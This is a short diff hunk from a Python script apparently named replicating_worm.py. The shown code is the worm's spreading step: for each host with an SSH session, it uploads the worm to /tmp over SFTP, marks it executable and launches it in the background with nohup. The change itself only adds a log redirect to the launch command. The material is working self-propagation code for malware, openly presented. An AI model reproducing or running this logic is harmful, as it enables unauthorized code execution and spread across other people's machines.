@@ -148,7 +148,7 @@ for Host in network:
 				sftpClient = sshInfo[0].open_sftp()
 				sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
 				sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
-				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
+				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py & > log.txt")
 			except:
 				print ("Something went wrong")
 
